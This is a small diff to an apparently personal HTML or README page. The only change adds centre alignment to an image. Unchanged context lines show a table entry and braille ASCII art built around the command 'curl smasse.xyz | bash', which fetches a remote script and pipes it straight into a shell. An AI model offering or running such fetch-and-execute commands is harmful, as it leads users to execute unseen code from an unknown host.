@@ -105,7 +105,7 @@
        <td>⭐⭐NORMINO⭐⭐ : curl smasse.xyz | bash
       </tr>
     </table>
-      <img src="https://github.com/Axeltheaxelotl/boite-a-foutre/blob/main/67c9cfd20d306676691206.gif?raw=true" alt="Sam et sa cousine" style="width:1000px; height:300px;">
+      <img align="center" src="https://github.com/Axeltheaxelotl/boite-a-foutre/blob/main/67c9cfd20d306676691206.gif?raw=true" alt="Sam et sa cousine" style="width:1000px; height:300px;">
       <br>
 curl smasse⢀⣤⣤⣤⣤⡀xyz | bash⠀curl s
 masse.xyz ⢠⣿⠋⠀⠀⠙⢿⣦⡀| bash curl sm
